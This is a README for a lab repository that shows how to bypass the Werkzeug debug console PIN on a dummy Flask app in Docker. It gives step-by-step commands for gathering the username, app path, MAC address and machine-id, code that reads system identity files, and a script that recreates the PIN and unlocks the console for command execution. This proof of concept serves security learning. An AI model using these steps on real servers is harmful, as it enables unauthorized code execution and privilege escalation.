# Werkzeug Debug Console Pin Bypass
Werkzeug has a debug console that requires a pin by default. It's possible to bypass this with an LFI vulnerability or use it as a local privilege escalation vector. The debug console will lock after 10 invalid attempts which requires the server to be restarted for another 10 guesses.

The Werkzeug documentation warns users to **never** enable the debug console in production with or without a pin (https://werkzeug.palletsprojects.com/en/2.0.x/debug/#debugger-pin).

This repo provides a sample application to play with the `/console` endpoint on a dummy Flask application.

# How to use

1. Clone this repo
```
$ git clone https://wdahlenburg/werkzeug-debug-console-bypass
```

2. Build the Docker image
```
$ docker build -t werkzeug-debug-console:latest .
```

3. Run the Docker image
```
$ docker run -p 7777:7777 werkzeug-debug-console:latest
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://172.17.0.4:7777/ (Press CTRL+C to quit)
 * Restarting with stat
User: werkzeug-user
Module: flask.app
Module Name: Flask
App Location: /usr/local/lib/python3.9/site-packages/flask/app.py
Mac Address: 2485377892356
Werkzeug Machine ID: b'ea1fc30b6f4a173cea015d229c6b55b69d0ff00819670374d7a02397bc236523a57e9bab0c6e6167470ac65b66075388'

 * Debugger is active!
 * Debugger PIN: 118-831-072
```

Your server should be running on port 7777 at this point. The PIN will be displayed in the Docker logs, which is what you will be trying to recreate.


### Exploiting as a local privilege escalation

A scenario that could come up is that the Flask server is running under a certain user with privileges X. You are a local user on the system with privileges Y. You have the ability to access the same information that Werkzeug uses to generate the PIN for the user running the server. Successfully unlocking the console provides OS command injection as the user running the server.

At any point if you are unsure, you can reference the Docker logs to see the expected values for each parameter.

1. Open up a new terminal and log into Docker as some other user

```
$ docker ps                                            
CONTAINER ID   IMAGE                               COMMAND                  CREATED          STATUS          PORTS                                                                                                                                                                                          NAMES
9d0ff0081967   werkzeug-debug-console:latest       "python3 /app/server…"   16 minutes ago   Up 16 minutes   0.0.0.0:7777->7777/tcp, :::7777->7777/tcp

$ docker exec -u 0 -it 9d0ff0081967 /bin/bash
root@9d0ff0081967:/app#
```

2. Take a look at https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py for references
3. Identify the user running the server on port 7777
```
$ ps auxww | grep server
werkzeu+     1  0.0  0.1  34992 28072 ?        Ss   15:50   0:00 python3 /app/server.py
werkzeu+    10  0.0  0.1  35248 23780 ?        S    15:50   0:00 python3 /app/server.py
werkzeu+    11  0.0  0.1  35072 28276 ?        S    15:50   0:00 /usr/local/bin/python3 /app/server.py
werkzeu+    12  0.7  0.1 109316 25500 ?        Sl   15:50   0:08 /usr/local/bin/python3 /app/server.py
```
It's likely the werkzeu user is running the server, but the name is truncated.

```
$ cat /etc/passwd
...
werkzeug-user:x:1000:1000::/home/werkzeug-user:/bin/sh
```

4. Copy the `werkzeug-user` into the username field of the `werkzeug-pin-bypass.py` file.

5. Find the correct path to Flask
```
$ find / -name "app.py" 2>/dev/null
/usr/local/lib/python3.9/site-packages/flask/app.py
```

6. Update the `werkzeug-pin-bypass.py` file with this information. The location will be different if alternate Python versions or OS's are used.
7. Grab the Mac Address of the interface the server is hosting on:
```
$  python3
Python 3.9.7 (default, Sep  3 2021, 02:02:37) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import uuid
>>> str(uuid.getnode())
'2485377892356'
```

OR

```
$ cat /sys/class/net/eth0/address 
02:42:ac:11:00:04
root@9d0ff0081967:/app# python3
Python 3.9.7 (default, Sep  3 2021, 02:02:37) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> "".join("02:42:ac:11:00:04".split(":"))
'0242ac110004'
>>> print(0x0242ac110004)
2485377892356
```
9. Update the Mac address in the `werkzeug-pin-bypass.py` file.
10. In python3 run the following script to generate the machine id
```python3
machine_id = b""
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
    try:
        with open(filename, "rb") as f:
            value = f.readline().strip()
    except OSError:
        continue

    if value:
        machine_id += value
        break
try:
    with open("/proc/self/cgroup", "rb") as f:
        machine_id += f.readline().strip().rpartition(b"/")[2]
except OSError:
    pass

print(machine_id)
```
12. Update the machine id in the `werkzeug-pin-bypass.py` file.
13. Go ahead and run the werkzeug-pin-bypass.py on the attacking machine
```
$  python3 ./werkzeug-pin-bypass.py
Pin: 118-831-072
```

If all goes well you should have the same Pin as the one displayed in the Docker logs. If not, recheck your steps. If you are on an old version of Werkzeug, try changing the hashing algorithm to md5 instead of sha1.

The pin can be accepted at http://127.0.0.1:7777/console. Once the system is unlocked you can run any python commands you want.

# Credit
The original research was done here: https://www.daehee.com/werkzeug-console-pin-exploit/

The LFI vector is listed here: https://github.com/grav3m1nd-byte/werkzeug-pin
